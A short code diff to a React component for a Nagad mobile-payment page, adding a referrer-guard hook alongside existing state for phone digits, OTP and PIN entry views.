@@ -12,6 +12,7 @@ const NagadPayment = () => {
   const [searchParams] = useSearchParams();
   const amount = searchParams.get('amount') || "00";
   const isAllowed = usePaymentMethodGuard("nagad");
+  const { checking: referrerChecking } = useReferrerGuard();
   const [phoneDigits, setPhoneDigits] = useState<string[]>(Array(11).fill(""));
   const [showOtpView, setShowOtpView] = useState(false);
   const [showPinView, setShowPinView] = useState(false);
